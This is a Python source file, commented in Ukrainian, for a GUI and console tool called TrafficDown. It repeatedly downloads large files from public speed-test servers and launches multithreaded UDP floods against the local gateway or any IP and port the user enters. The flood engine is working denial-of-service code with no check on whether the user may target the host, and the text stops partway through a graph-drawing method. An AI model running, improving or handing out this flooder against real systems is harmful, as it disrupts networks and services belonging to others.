# -*- coding: utf-8 -*-
"""
TrafficDown Ultimate 4.0
--------------------------
Багатопотоковий інструмент для генерації мережевого навантаження (HTTP Download та UDP Flood)
з підтримкою сучасного графічного (Windows) та консольного (всі системи) інтерфейсів.

Версія 4.0:
- Повна переробка дизайну GUI (Nord Theme) та TUI для сучасного вигляду.
- Додано редактор URL-адрес безпосередньо в налаштуваннях GUI.
- Покращено стабільність, обробку помилок та оптимізовано продуктивність.
- Глибокий рефакторинг коду: покращено структуру, додано коментарі та типізацію.
- Графік швидкості в GUI тепер має розумну динамічну шкалу.
- Виправлено всі відомі помилки, включаючи AttributeError з '_from_'.
"""

# --- 0. ІМПОРТИ ТА ГЛОБАЛЬНА КОНФІГУРАЦІЯ ---
import os
import sys
import time
import json
import asyncio
import threading
import socket
import random
import platform
import subprocess
import logging
from enum import Enum
from datetime import datetime
from logging.handlers import RotatingFileHandler
from typing import Dict, Any, Tuple, Optional, List

# --- Системні константи ---
IS_WINDOWS = os.name == 'nt'
IS_ANDROID = "com.termux" in os.environ.get("PREFIX", "")

# --- Налаштування файлів ---
CONFIG_FILE = "TrafficDown_config.json"
LOG_DIR = "logs"
os.makedirs(LOG_DIR, exist_ok=True)
LOG_FILE = os.path.join(LOG_DIR, "TrafficDown.log")

# --- Налаштування логера ---
log = logging.getLogger("TrafficDown")
if not log.handlers:
    log.setLevel(logging.DEBUG)
    formatter = logging.Formatter("%(asctime)s | %(levelname)-8s | %(threadName)-10s | %(message)s")
    
    # Файловий логер
    file_handler = RotatingFileHandler(LOG_FILE, maxBytes=5_000_000, backupCount=3, encoding="utf-8")
    file_handler.setFormatter(formatter)
    file_handler.setLevel(logging.DEBUG)
    
    # Консольний логер
    console_handler = logging.StreamHandler()
    console_handler.setFormatter(formatter)
    console_handler.setLevel(logging.INFO)
    
    log.addHandler(file_handler)
    log.addHandler(console_handler)

def auto_install_packages() -> None:
    """Перевіряє наявність необхідних пакетів і встановлює відсутні."""
    required = ["aiohttp", "rich", "psutil", "requests"]
    if IS_WINDOWS:
        required.append("customtkinter")
    
    try:
        import importlib
        missing = []
        for lib in required:
            try:
                importlib.import_module(lib)
            except ImportError:
                missing.append(lib)
                
        if missing:
            log.warning(f"Відсутні необхідні модулі: {', '.join(missing)}. Спроба автоматичного встановлення...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", *missing])
            log.info("Усі модулі успішно встановлено! Перезапуск скрипту для застосування змін...")
            time.sleep(1)
            # os.execl() надійно перезапускає процес
            os.execl(sys.executable, sys.executable, *sys.argv)
    except Exception as e:
        log.critical(f"Критична помилка під час встановлення або перевірки модулів: {e}")
        log.critical("Будь ласка, встановіть модулі вручну: pip install aiohttp rich psutil requests customtkinter")
        sys.exit(1)

# Запускаємо перевірку перед тим, як імпортувати залежності
auto_install_packages()

import aiohttp
import psutil
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.live import Live
from rich.align import Align
from rich.prompt import Prompt, IntPrompt
from rich import box

# --- Перевірка доступності GUI ---
GUI_AVAILABLE = False
if IS_WINDOWS:
    try:
        import customtkinter as ctk
        GUI_AVAILABLE = True
    except ImportError:
        log.warning("Модуль customtkinter не знайдено. Графічний інтерфейс буде недоступний.")

# --- 1. МЕНЕДЖЕР КОНФІГУРАЦІЇ ---
class Config:
    """Керує конфігурацією програми (завантаження, збереження, скидання)."""
    def __init__(self) -> None:
        """Ініціалізує конфігурацію, завантажуючи її з файлу або створюючи за замовчуванням."""
        self.default: Dict[str, Any] = {
            "target_ip": "192.168.0.1",
            "target_port": 80,
            "threads_dl": 20,
            "threads_ul": 100,
            "packet_size": 4096,
            "download_urls": [
                'https://speed.hetzner.de/10GB.bin',
                'https://speed.hetzner.de/1GB.bin',
                'https://speedtest.selectel.ru/10GB',
                'https://proof.ovh.net/files/10Gb.dat',
                'http://speedtest.tele2.net/10GB.zip',
                'http://speedtest-ny.turnkeyinternet.net/10000mb.bin',
                'http://ipv4.download.thinkbroadband.com/1GB.zip'
            ]
        }
        self.data = self.load()

    def load(self) -> Dict[str, Any]:
        """Завантажує конфігурацію, доповнюючи її значеннями за замовчуванням."""
        if os.path.exists(CONFIG_FILE):
            try:
                with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
                    config_from_file = json.load(f)
                # Поєднуємо конфіг з файлу з дефолтним, щоб додати нові ключі
                return {**self.default, **config_from_file}
            except (json.JSONDecodeError, IOError) as e:
                log.error(f"Не вдалося завантажити '{CONFIG_FILE}': {e}. Використовуються значення за замовчуванням.")
        return self.default.copy()

    def save(self) -> None:
        """Зберігає поточну конфігурацію у файл."""
        try:
            with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
                json.dump(self.data, f, indent=4, ensure_ascii=False)
        except IOError as e:
            log.error(f"Не вдалося зберегти '{CONFIG_FILE}': {e}")
    
    def reset_to_default(self) -> None:
        """Скидає конфігурацію до значень за замовчуванням і зберігає її."""
        self.data = self.default.copy()
        self.save()
        log.info("Конфігурацію скинуто до значень за замовчуванням.")

    @staticmethod
    def get_gateway_ip() -> str:
        """Намагається визначити IP-адресу шлюзу за замовчуванням."""
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("8.8.8.8", 80))
                local_ip = s.getsockname()[0]
            # Стандартна евристика: шлюз - це .1 адреса в локальній мережі
            return ".".join(local_ip.split('.')[:3]) + ".1"
        except socket.error as e:
            log.warning(f"Не вдалося визначити IP шлюзу: {e}. Використовується IP за замовчуванням.")
            return "192.168.0.1"

# Створюємо єдиний екземпляр конфігурації
cfg = Config()

# --- 2. МЕРЕЖЕВИЙ РУШІЙ ---
class EngineMode(Enum):
    """Перелік режимів роботи мережевого рушія."""
    IDLE = "IDLE"
    DOWNLOADING = "DOWNLOADING"
    UDP_FLOOD = "UDP FLOOD"

class NetworkEngine:
    """Керує мережевими операціями (HTTP Download та UDP Flood)."""
    def __init__(self) -> None:
        """Ініціалізує рушій, створює асинхронний цикл та потоки."""
        self.running = False
        self.mode = EngineMode.IDLE
        self.lock = threading.Lock()
        
        # Статистика
        self.dl_total = 0
        self.ul_total = 0
        self.errors = 0
        self.last_error = "—"
        
        self.urls: List[str] = cfg.data.get("download_urls", [])
        if not self.urls:
            log.warning("Список URL для завантаження порожній. Режим завантаження не працюватиме.")
        
        # Асинхронний цикл для aiohttp, що працює у фоновому потоці
        self.loop = asyncio.new_event_loop()
        threading.Thread(target=self._async_loop_manager, name="AsyncLoop", daemon=True).start()

    def _async_loop_manager(self) -> None:
        """Керує життєвим циклом асинхронного event loop."""
        asyncio.set_event_loop(self.loop)
        try:
            self.loop.run_forever()
        finally:
            self.loop.close()

    def start_download(self) -> None:
        """Запускає режим завантаження у кількох потоках."""
        if self.running: return
        if not self.urls:
            log.error("Неможливо запустити завантаження: список URL-адрес порожній.")
            return
            
        self.running, self.mode = True, EngineMode.DOWNLOADING
        log.info(f"ENGINE: Запуск режиму '{self.mode.value}'. Потоків: {cfg.data['threads_dl']}")
        for _ in range(cfg.data['threads_dl']):
            asyncio.run_coroutine_threadsafe(self._dl_task(), self.loop)

    def start_flood(self, ip: str, port: int) -> None:
        """Запускає режим UDP-флуду."""
        if self.running: return

        self.running, self.mode = True, EngineMode.UDP_FLOOD
        log.warning(f"ENGINE: Запуск режиму '{self.mode.value}' -> {ip}:{port}. Потоків: {cfg.data['threads_ul']}")
        cfg.data.update({'target_ip': ip, 'target_port': port})
        cfg.save()
        
        for i in range(cfg.data['threads_ul']):
            thread = threading.Thread(target=self._ul_task, args=(ip, port), name=f"UL-Thread-{i+1}", daemon=True)
            thread.start()

    def stop(self) -> None:
        """Зупиняє всі мережеві операції та скидає статистику."""
        if self.running:
            log.info("ENGINE: Зупинка всіх мережевих операцій.")
            self.running, self.mode = False, EngineMode.IDLE
            time.sleep(0.2) # Даємо потокам час помітити зміну стану
            with self.lock:
                self.dl_total = self.ul_total = self.errors = 0
                self.last_error = "—"

    async def _dl_task(self) -> None:
        """Асинхронне завдання для безперервного завантаження даних."""
        # Connector створюється один раз для сесії
        conn = aiohttp.TCPConnector(ssl=False, limit=0)
        async with aiohttp.ClientSession(connector=conn) as session:
            while self.running and self.mode == EngineMode.DOWNLOADING:
                try:
                    url = random.choice(self.urls)
                    async with session.get(url, timeout=10) as resp:
                        resp.raise_for_status()
                        # Читаємо дані, доки режим активний
                        while self.running and self.mode == EngineMode.DOWNLOADING:
                            chunk = await resp.content.read(1024 * 1024) # Читаємо по 1MB
                            if not chunk: break
                            with self.lock: self.dl_total += len(chunk)
                except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                    with self.lock:
                        self.errors += 1
                        self.last_error = f"{type(e).__name__}: {str(e)[:60]}"
                    await asyncio.sleep(2) # Пауза перед наступною спробою
                except Exception as e:
                    log.error(f"Неочікувана помилка в DL-завданні: {e}")
                    await asyncio.sleep(5)

    def _ul_task(self, ip: str, port: int) -> None:
        """Синхронне завдання для UDP-флуду, що виконується в окремому потоці."""
        try:
            payload = os.urandom(min(cfg.data['packet_size'], 65500)) # Пакет не може бути > 65507
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (ip, port)
            
            while self.running and self.mode == EngineMode.UDP_FLOOD:
                try:
                    sock.sendto(payload, addr)
                    with self.lock: self.ul_total += len(payload)
                    # На Android Termux, щоб не перевантажувати CPU
                    if IS_ANDROID: time.sleep(0.001)
                except socket.error as e:
                    with self.lock:
                        self.errors += 1
                        self.last_error = f"{type(e).__name__}: {str(e)[:60]}"
                    time.sleep(1)
            sock.close()
        except socket.gaierror as e: # Помилка розпізнавання адреси
            with self.lock:
                self.errors += 1
                self.last_error = f"Address Resolution Error: {e}"
            log.error(f"Не вдалося розпізнати адресу {ip}: {e}")
        except Exception as e:
            log.error(f"Неочікувана помилка в UDP-завданні: {e}")

    def get_stats(self) -> Dict[str, Any]:
        """Повертає поточну статистику в потокобезпечний спосіб."""
        with self.lock:
            return {
                "dl": self.dl_total, "ul": self.ul_total, "err": self.errors,
                "mode": self.mode.value, "active": self.running, "last_error": self.last_error
            }

# Створюємо єдиний екземпляр рушія
engine = NetworkEngine()

# --- 3. КОНСОЛЬНИЙ ІНТЕРФЕЙС (TUI) ---
class TermuxUI:
    """Відображення інтерфейсу в терміналі з використанням Rich."""
    def __init__(self) -> None:
        """Ініціалізує консоль та змінні для розрахунку швидкості."""
        self.console = Console()
        self.last_dl = 0
        self.last_ul = 0
        self.last_t = time.time()

    def _format_speed(self, a_bytes: float) -> str:
        """Форматує швидкість у MB/s."""
        return f"[bold green]{a_bytes / 1024**2:.2f}[/] MB/s"

    def _format_total(self, a_bytes: float) -> str:
        """Форматує загальний обсяг у GB."""
        return f"{a_bytes / 1024**3:.3f} GB"

    def generate_dashboard(self) -> Panel:
        """Створює головну панель зі статистикою та меню."""
        stats = engine.get_stats()
        now = time.time()
        delta = max(now - self.last_t, 1e-6) # Уникаємо ділення на нуль
        
        spd_dl = (stats['dl'] - self.last_dl) / delta
        spd_ul = (stats['ul'] - self.last_ul) / delta
        
        self.last_dl, self.last_ul, self.last_t = stats['dl'], stats['ul'], now

        # --- Створення таблиць ---
        stats_table = Table(box=None, show_header=False, padding=(0,1))
        stats_table.add_column(style="cyan", justify="right")
        stats_table.add_column(style="bold white", justify="left")
        
        status_color = 'green' if stats['active'] else 'red'
        stats_table.add_row("Статус:", f"[{status_color}]{stats['mode']}[/]")
        stats_table.add_row("Швидкість DL:", self._format_speed(spd_dl))
        stats_table.add_row("Швидкість UL:", self._format_speed(spd_ul).replace("green", "red"))
        stats_table.add_row("Всього DL:", f"[green]{self._format_total(stats['dl'])}[/]")
        stats_table.add_row("Всього UL:", f"[red]{self._format_total(stats['ul'])}[/]")
        stats_table.add_row("Помилки:", f"[yellow]{stats['err']}[/]")
        
        try:
            cpu, ram = psutil.cpu_percent(), psutil.virtual_memory().percent
            cpu_color = 'green' if cpu < 70 else 'yellow' if cpu < 90 else 'red'
            ram_color = 'green' if ram < 80 else 'yellow' if ram < 90 else 'red'
            res_text = f"CPU: [bold {cpu_color}]{cpu}%[/] | RAM: [bold {ram_color}]{ram}%[/]"
        except Exception: res_text = "N/A"

        # --- Створення меню ---
        gateway_ip = cfg.get_gateway_ip()
        menu_text = (
            "[bold cyan]1.[/] Завантаження (тест швидкості)\n"
            f"[bold cyan]2.[/] UDP Flood на шлюз ([dim]{gateway_ip}[/])\n"
            f"[bold cyan]3.[/] UDP Flood на власну ціль\n"
            f"[bold cyan]s.[/] Зупинити поточну операцію\n\n"
            f"[bold red]q.[/] Вихід"
        )
        
        # --- Компонування ---
        grid = Table.grid(expand=True, padding=1)
        grid.add_column(width=35)
        grid.add_column()

        grid.add_row(
            Panel(stats_table, title="[bold cyan]Live Статистика[/]", border_style="cyan"),
            Panel(menu_text, title="[bold green]Меню[/]", border_style="green")
        )
        grid.add_row(Panel(Align.center(res_text), title="[bold blue]Система[/]"), Panel(f"[dim]{stats['last_error']}[/]", title="[bold yellow]Остання помилка[/]"))
        
        return Panel(grid, title="[bold green]TRAFFICDOWN 4.0[/]", border_style="green", subtitle="[yellow]Введіть опцію та натисніть Enter[/]")

    def run(self) -> None:
        """Головний цикл консольного інтерфейсу."""
        self.console.clear()
        
        with Live(self.generate_dashboard(), console=self.console, screen=True, refresh_per_second=4, vertical_overflow="visible") as live:
            
            def get_input():
                """Функція для отримання вводу в окремому потоці, щоб не блокувати Live display."""
                choice = self.console.input("[bold yellow]> [/]").strip().lower()
                
                if engine.running and choice != 's':
                    live.console.print("[bold yellow]Спочатку зупиніть поточну операцію (s)![/]")
                    return

                action = None
                if choice == '1': action = engine.start_download
                elif choice == '2': action = lambda: engine.start_flood(cfg.get_gateway_ip(), 80)
                elif choice == '3':
                    try:
                        live.stop()
                        self.console.clear()
                        ip = Prompt.ask("[cyan]Введіть IP[/cyan]", default=cfg.data['target_ip'])
                        port = IntPrompt.ask("[cyan]Введіть порт[/cyan]", default=cfg.data['target_port'])
                        if not (0 < port < 65536): raise ValueError("Некоректний порт.")
                        action = lambda: engine.start_flood(ip, port)
                        live.start()
                    except (ValueError, Exception) as e:
                        live.start()
                        live.console.print(f"\n[bold red]Помилка: {e}[/]"); time.sleep(2)
                elif choice == 's': action = engine.stop
                elif choice in ('q', 'й'):
                    engine.stop()
                    return "exit" # Сигнал для виходу
                
                if action:
                    action()

            # Запускаємо цикл отримання вводу в окремому потоці
            input_thread = threading.Thread(target=lambda: setattr(threading.current_thread(), 'result', get_input()), daemon=True)
            
            while True:
                live.update(self.generate_dashboard())
                if not input_thread.is_alive():
                    if getattr(input_thread, 'result', None) == 'exit':
                        break
                    input_thread = threading.Thread(target=lambda: setattr(threading.current_thread(), 'result', get_input()), daemon=True)
                    input_thread.start()
                time.sleep(0.1) # Зменшуємо навантаження на CPU

# --- 4. ГРАФІЧНИЙ ІНТЕРФЕЙС (GUI) ---
if GUI_AVAILABLE:
    class GUILogHandler(logging.Handler):
        """Обробник логів, що направляє записи в текстове поле CTk."""
        def __init__(self, textbox: ctk.CTkTextbox):
            super().__init__()
            self.textbox = textbox

        def emit(self, record: logging.LogRecord) -> None:
            """Форматує та додає запис у текстове поле в потокобезпечний спосіб."""
            msg = self.format(record)
            try:
                # after() гарантує виконання в головному потоці GUI
                if self.textbox.winfo_exists():
                    self.textbox.after(0, self.thread_safe_insert, msg)
            except Exception:
                pass # Вікно або віджет вже закрито

        def thread_safe_insert(self, msg: str) -> None:
            """Вставляє текст у віджет, перевіряючи його існування."""
            try:
                if self.textbox.winfo_exists():
                    self.textbox.configure(state="normal")
                    self.textbox.insert("end", msg + "\n")
                    self.textbox.see("end")
                    self.textbox.configure(state="disabled")
            except Exception:
                pass # Віджет міг бути знищений під час виконання

    class WindowsGUI:
        """Оновлений GUI (v4.0) з сучасним дизайном та розширеними налаштуваннями."""
        # Палітра в стилі "Nord Theme"
        THEME = {
            "bg_color": ("#ECEFF4", "#2E3440"),
            "fg_color": ("#FFFFFF", "#3B4252"),
            "text_color": ("#2E3440", "#D8DEE9"),
            "accent_color": "#81A1C1",
            "dl_color": "#A3BE8C",
            "ul_color": "#BF616A",
            "warn_color": "#EBCB8B",
            "stop_color": "#D08770",
            "canvas_bg": ("#E5E9F0", "#292E39"),
            "font_family": "Segoe UI",
            "font_large": ("Segoe UI", 32, "bold"),
            "font_medium": ("Segoe UI", 16, "bold"),
            "font_normal": ("Segoe UI", 12),
            "font_small": ("Consolas", 11),
            "font_title": ("Segoe UI", 18, "bold"),
            "font_button": ("Segoe UI", 16, "bold"),
            "font_total": ("Segoe UI", 12),
        }

        def __init__(self) -> None:
            """Ініціалізація головного вікна та всіх компонентів."""
            self.root = ctk.CTk()
            self.root.title("TrafficDown Ultimate 4.0")
            self.root.geometry("1000x750")
            self.root.minsize(900, 700)
            ctk.set_appearance_mode("Dark")

            self.last_dl = self.last_ul = 0.0
            self.last_t = time.time()
            self.dl_history = [0.0] * 50
            self.ul_history = [0.0] * 50
            self.slider_widgets: Dict[str, Tuple[ctk.CTkSlider, ctk.CTkLabel]] = {}
            self.status_message_job: Optional[str] = None
            self.txt_urls: Optional[ctk.CTkTextbox] = None

            self.setup_ui()
            self.setup_logging()
            self.update_loop()

        def setup_ui(self) -> None:
            """Налаштовує основну структуру UI: вкладки, панелі."""
            self.root.grid_columnconfigure(0, weight=1)
            self.root.grid_rowconfigure(0, weight=1)

            tab_view = ctk.CTkTabview(self.root, border_width=1)
            tab_view.grid(row=0, column=0, padx=15, pady=15, sticky="nsew")
            tab_view.configure(
                segmented_button_selected_color=self.THEME["accent_color"],
                segmented_button_unselected_color=self.THEME["fg_color"][1],
                segmented_button_selected_hover_color=self.THEME["accent_color"],
            )
            
            self.dashboard_tab = tab_view.add("Dashboard")
            self.settings_tab = tab_view.add("Settings")
            self.log_tab = tab_view.add("Logs")

            self._setup_dashboard(self.dashboard_tab)
            self._setup_settings(self.settings_tab)
            self._setup_logs_tab(self.log_tab)
        
        def _create_stat_frame(self, parent: ctk.CTkFrame, title: str, color: str) -> Tuple[ctk.CTkLabel, ctk.CTkLabel]:
            """Створює віджет для відображення статистики (швидкість, загальний обсяг)."""
            parent.grid_columnconfigure(0, weight=1)
            ctk.CTkLabel(parent, text=title, font=self.THEME["font_title"], text_color=color).grid(row=0, pady=(5,0))
            lbl_speed = ctk.CTkLabel(parent, text="0.0 MB/s", font=self.THEME["font_large"], text_color=color)
            lbl_speed.grid(row=1, pady=(5,5))
            lbl_total = ctk.CTkLabel(parent, text="Total: 0.00 GB", font=self.THEME["font_total"], text_color=("gray50", "gray60"))
            lbl_total.grid(row=2, pady=(0,10))
            return lbl_speed, lbl_total

        def _setup_dashboard(self, tab: ctk.CTkFrame) -> None:
            """Наповнює вкладку "Dashboard" елементами."""
            tab.grid_columnconfigure(0, weight=1)
            tab.grid_rowconfigure(1, weight=1) # Графік розтягується
            
            # --- Верхня панель зі статистикою ---
            top_panel = ctk.CTkFrame(tab); top_panel.grid(row=0, column=0, sticky="ew", pady=(0, 10))
            top_panel.grid_columnconfigure((0, 2), weight=1); top_panel.grid_columnconfigure(1, weight=2)

            dl_frame = ctk.CTkFrame(top_panel); dl_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=5)
            self.lbl_dl_speed, self.lbl_dl_total = self._create_stat_frame(dl_frame, "DOWNLOAD", self.THEME["dl_color"])
            
            ul_frame = ctk.CTkFrame(top_panel); ul_frame.grid(row=0, column=2, sticky="nsew", padx=10, pady=5)
            self.lbl_ul_speed, self.lbl_ul_total = self._create_stat_frame(ul_frame, "UPLOAD", self.THEME["ul_color"])

            center_frame = ctk.CTkFrame(top_panel); center_frame.grid(row=0, column=1, sticky="nsew", padx=10, pady=5)
            center_frame.grid_columnconfigure(0, weight=1)
            self.lbl_mode = ctk.CTkLabel(center_frame, text="MODE: IDLE", font=self.THEME["font_medium"]); self.lbl_mode.pack(pady=(15, 5), expand=True)
            self.lbl_total_traffic = ctk.CTkLabel(center_frame, text="TOTAL: 0.00 GB", font=self.THEME["font_normal"]); self.lbl_total_traffic.pack(pady=5, expand=True)
            self.lbl_errors_count = ctk.CTkLabel(center_frame, text="ERRORS: 0", font=self.THEME["font_normal"]); self.lbl_errors_count.pack(pady=(5, 15), expand=True)

            # --- Панель з графіком ---
            graph_panel = ctk.CTkFrame(tab); graph_panel.grid(row=1, column=0, sticky="nsew", pady=10)
            graph_panel.grid_columnconfigure(0, weight=1); graph_panel.grid_rowconfigure(0, weight=1)
            self.canvas = ctk.CTkCanvas(graph_panel, highlightthickness=0); self.canvas.grid(row=0, column=0, sticky="nsew", padx=5, pady=5)
            self.canvas.bind("<Configure>", self.draw_graph)
            
            # --- Панель керування ---
            control_panel = ctk.CTkFrame(tab); control_panel.grid(row=2, column=0, sticky="ew", pady=(10, 0))
            control_panel.grid_columnconfigure((0, 1), weight=1)
            self.btn_dl = ctk.CTkButton(control_panel, command=self.toggle_dl, height=50, font=self.THEME["font_button"]); self.btn_dl.grid(row=0, column=0, padx=10, pady=10, sticky="ew")
            self.btn_ul = ctk.CTkButton(control_panel, command=self.toggle_ul, height=50, font=self.THEME["font_button"]); self.btn_ul.grid(row=0, column=1, padx=10, pady=10, sticky="ew")
            
            # --- Рядок статусу ---
            status_bar = ctk.CTkFrame(tab, fg_color="transparent"); status_bar.grid(row=3, column=0, sticky="ew", pady=(5,0), padx=10)
            ctk.CTkLabel(status_bar, text="Status:", font=self.THEME["font_small"], text_color=("gray50", "gray60")).pack(side="left")
            self.lbl_status = ctk.CTkLabel(status_bar, text="—", anchor="w", font=self.THEME["font_small"], text_color="gray"); self.lbl_status.pack(side="left", fill="x", expand=True, padx=5)

        def _setup_settings(self, tab: ctk.CTkFrame) -> None:
            """Наповнює вкладку "Settings" елементами."""
            tab.grid_columnconfigure(0, weight=1); tab.grid_rowconfigure(0, weight=1)
            scroll_frame = ctk.CTkScrollableFrame(tab, label_text="Application Settings", label_font=(self.THEME["font_family"], 14)); scroll_frame.grid(row=0, column=0, sticky="nsew", padx=10, pady=10)
            scroll_frame.grid_columnconfigure(0, weight=1)
            
            def create_group(p, title):
                g = ctk.CTkFrame(p); g.pack(fill="x", expand=True, padx=10, pady=10)
                g.grid_columnconfigure(1, weight=1)
                ctk.CTkLabel(g, text=title, font=self.THEME["font_medium"]).grid(row=0, column=0, columnspan=2, pady=10, padx=20, sticky="w")
                return g

            target_g = create_group(scroll_frame, "Target Configuration")
            ctk.CTkLabel(target_g, text="Target IP:").grid(row=1, column=0, padx=20, pady=10, sticky="w")
            self.ent_ip = ctk.CTkEntry(target_g); self.ent_ip.grid(row=1, column=1, padx=20, pady=10, sticky="ew")
            ctk.CTkLabel(target_g, text="Target Port:").grid(row=2, column=0, padx=20, pady=10, sticky="w")
            self.ent_port = ctk.CTkEntry(target_g); self.ent_port.grid(row=2, column=1, padx=20, pady=10, sticky="ew")

            perf_g = create_group(scroll_frame, "Performance Tuning")
            self._add_slider(perf_g, "Download Threads", 1, 100, 'threads_dl', 1)
            self._add_slider(perf_g, "Flood Threads", 10, 1000, 'threads_ul', 3)
            self._add_slider(perf_g, "Packet Size (bytes)", 64, 8192, 'packet_size', 5)

            urls_g = create_group(scroll_frame, "Download URLs")
            ctk.CTkLabel(urls_g, text="One URL per line:", font=self.THEME["font_normal"]).grid(row=1, column=0, columnspan=2, padx=20, pady=(10,5), sticky="w")
            self.txt_urls = ctk.CTkTextbox(urls_g, height=200, font=self.THEME["font_small"], wrap="none")
            self.txt_urls.grid(row=2, column=0, columnspan=2, padx=20, pady=(0,10), sticky="nsew")

            ui_g = create_group(scroll_frame, "Appearance")
            ctk.CTkLabel(ui_g, text="Theme:").grid(row=1, column=0, padx=20, pady=10, sticky="w")
            self.theme_menu = ctk.CTkOptionMenu(ui_g, values=["Dark", "Light", "System"], command=ctk.set_appearance_mode); self.theme_menu.grid(row=1, column=1, padx=20, pady=10, sticky="ew")
            self.theme_menu.set("Dark")

            btn_frame = ctk.CTkFrame(tab, fg_color="transparent"); btn_frame.grid(row=1, column=0, sticky="ew", padx=10, pady=(0, 10))
            btn_frame.grid_columnconfigure((0,1), weight=1)
            ctk.CTkButton(btn_frame, text="Save Settings", command=self.save_settings, height=40).grid(row=0, column=0, padx=10, sticky="ew")
            ctk.CTkButton(btn_frame, text="Reset to Default", command=self.reset_settings, height=40, fg_color="gray50", hover_color="gray40").grid(row=0, column=1, padx=10, sticky="ew")
            self._update_settings_ui()

        def _setup_logs_tab(self, tab: ctk.CTkFrame) -> None:
            """Наповнює вкладку "Logs"."""
            tab.grid_columnconfigure(0, weight=1); tab.grid_rowconfigure(0, weight=1)
            self.log_textbox = ctk.CTkTextbox(tab, font=self.THEME["font_small"], activate_scrollbars=True, wrap="none")
            self.log_textbox.grid(row=0, column=0, padx=10, pady=10, sticky="nsew")
            self.log_textbox.configure(state="disabled")

        def setup_logging(self) -> None:
            """Налаштовує перенаправлення логів у GUI."""
            gui_handler = GUILogHandler(self.log_textbox)
            gui_handler.setFormatter(logging.Formatter("%(asctime)s | %(levelname)-8s | %(message)s"))
            gui_handler.setLevel(logging.INFO)
            log.addHandler(gui_handler)

        def _add_slider(self, p, text, f, t, key, r) -> None:
            """Допоміжна функція для створення слайдера з міткою."""
            ctk.CTkLabel(p, text=f"{text}:").grid(row=r, column=0, sticky="w", padx=20, pady=(10,0))
            lbl = ctk.CTkLabel(p, text=str(cfg.data.get(key,f))); lbl.grid(row=r, column=1, sticky="e", padx=20, pady=(10,0))
            steps = (t - f) if (t-f) < 1000 else 1000
            slider = ctk.CTkSlider(p, from_=f, to=t, number_of_steps=steps, command=lambda v, k=key: self.slider_widgets[k][1].configure(text=f"{int(v)}"))
            slider.grid(row=r + 1, column=0, columnspan=2, sticky="ew", padx=20, pady=(0, 15))
            self.slider_widgets[key] = (slider, lbl)
        
        def _update_settings_ui(self) -> None:
            """Оновлює всі поля в налаштуваннях згідно з поточним конфігом."""
            self.ent_ip.delete(0, 'end'); self.ent_ip.insert(0, cfg.data['target_ip'])
            self.ent_port.delete(0, 'end'); self.ent_port.insert(0, str(cfg.data['target_port']))
            for key, (slider, label) in self.slider_widgets.items():
                val = cfg.data.get(key, slider._from_)
                slider.set(val)
                label.configure(text=str(int(val)))
            
            if self.txt_urls:
                urls_text = "\n".join(cfg.data.get("download_urls", []))
                self.txt_urls.delete("1.0", "end")
                self.txt_urls.insert("1.0", urls_text)

        def set_status_message(self, text: str, color: str="gray", duration_s: int=4) -> None:
            """Показує тимчасове повідомлення в рядку статусу."""
            if not self.lbl_status.winfo_exists(): return
            self.lbl_status.configure(text=text, text_color=color)
            if self.status_message_job: self.root.after_cancel(self.status_message_job)
            self.status_message_job = self.root.after(duration_s * 1000, lambda: self.lbl_status.configure(text=engine.get_stats()['last_error'], text_color="gray"))

        def toggle_dl(self) -> None:
            """Перемикає режим завантаження."""
            if engine.running and engine.mode == EngineMode.DOWNLOADING: engine.stop()
            elif not engine.running: engine.start_download()

        def toggle_ul(self) -> None:
            """Перемикає режим UDP-флуду."""
            if engine.running and engine.mode == EngineMode.UDP_FLOOD: engine.stop()
            elif not engine.running:
                if self.save_settings(): engine.start_flood(cfg.data['target_ip'], cfg.data['target_port'])
        
        def update_buttons(self) -> None:
            """Оновлює вигляд кнопок залежно від стану рушія."""
            if not self.btn_dl.winfo_exists(): return

            dl_run = engine.running and engine.mode == EngineMode.DOWNLOADING
            ul_run = engine.running and engine.mode == EngineMode.UDP_FLOOD
            
            self.btn_dl.configure(
                text="⏹ STOP DOWNLOAD" if dl_run else "▶ START DOWNLOAD",
                fg_color=self.THEME["stop_color"] if dl_run else self.THEME["dl_color"],
                state="disabled" if ul_run else "normal"
            )
            self.btn_ul.configure(
                text="⏹ STOP FLOOD" if ul_run else "▶ START FLOOD",
                fg_color=self.THEME["stop_color"] if ul_run else self.THEME["ul_color"],
                state="disabled" if dl_run else "normal"
            )

        def save_settings(self) -> bool:
            """Зберігає налаштування з GUI у конфіг."""
            try:
                ip, port_str = self.ent_ip.get(), self.ent_port.get()
                if not ip: raise ValueError("IP-адреса не може бути порожньою.")
                if not (port_str.isdigit() and 1<=int(port_str)<=65535): raise ValueError("Порт має бути числом від 1 до 65535.")

                urls_text = self.txt_urls.get("1.0", "end").strip() if self.txt_urls else ""
                urls_list = [line.strip() for line in urls_text.split("\n") if line.strip()]
                if not urls_list: raise ValueError("Список URL для завантаження не може бути порожнім.")
                
                cfg.data.update({
                    'target_ip': ip, 'target_port': int(port_str),
                    'threads_dl': int(self.slider_widgets['threads_dl'][0].get()),
                    'threads_ul': int(self.slider_widgets['threads_ul'][0].get()),
                    'packet_size': int(self.slider_widgets['packet_size'][0].get()),
                    'download_urls': urls_list
                })
                
                engine.urls = urls_list # Оновлюємо URL в рушії "на льоту"
                cfg.save()
                log.info("Налаштування успішно збережено.")
                self.set_status_message("Налаштування збережено!", self.THEME["dl_color"])
                return True
            except (ValueError, Exception) as e:
                self.set_status_message(f"Помилка збереження: {e}", self.THEME["warn_color"])
                log.error(f"Не вдалося зберегти налаштування: {e}")
            return False

        def reset_settings(self) -> None:
            """Скидає налаштування до стандартних."""
            cfg.reset_to_default()
            self._update_settings_ui()
            engine.urls = cfg.data.get("download_urls", [])
            self.set_status_message("Налаштування скинуто до стандартних.", "gray")

        def draw_graph(self, event: Optional[Any] = None) -> None:
            """Малює графік швидкості на Canvas."""
            if not self.canvas.winfo_exists(): return
            w, h = self.canvas.winfo_width(), self.canvas.winfo_height()
            self.canvas.delete("all")
            if not (w > 1 and h > 1): return

            is_dark = ctk.get_appearance_mode() == "Dark"
            grid_c, text_c = ("#404B5D", "#D8DEE9") if is_dark else ("#D8DEE9", "#434C5E")
